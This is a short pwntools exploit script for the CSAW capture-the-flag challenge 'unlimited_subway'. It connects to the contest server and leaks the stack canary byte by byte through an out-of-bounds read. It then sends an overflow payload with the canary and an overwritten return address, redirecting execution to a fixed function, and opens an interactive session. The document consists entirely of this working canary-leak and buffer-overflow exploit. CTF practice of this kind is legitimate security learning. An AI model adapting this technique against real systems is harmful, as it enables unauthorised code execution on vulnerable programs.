#!/usr/bin/python3
from pwn import *

"""p = gdb.debug('./unlimited_subway','''
    b main
    b *0x08049538
    b *0x0804953d              
    c
''')"""

#p = process('./unlimited_subway')
p = remote('pwn.csaw.io', 7900)

def get_val(offset):
    p.recvuntil('>')
    p.sendline('V')
    p.sendline(offset)
    val = str(p.recvline())
    val = int(val.split(':')[2].split('\\n')[0], 16)
    val = format(val, 'x')
    if val == '0':
        val = '00'
    return val

#canary: 131,130,129,128

#get canary
canary = ''
canary += get_val('131')
canary += get_val('130')
canary += get_val('129')
canary += get_val('128')

canary = int(canary, 16)
canary = p32(canary)

p.recvuntil('>')
p.sendline('E')
p.sendline('76') #just before canary
p.sendline(b'A'*64 + canary + b'B'*4 + p32(0x8049304))
p.interactive()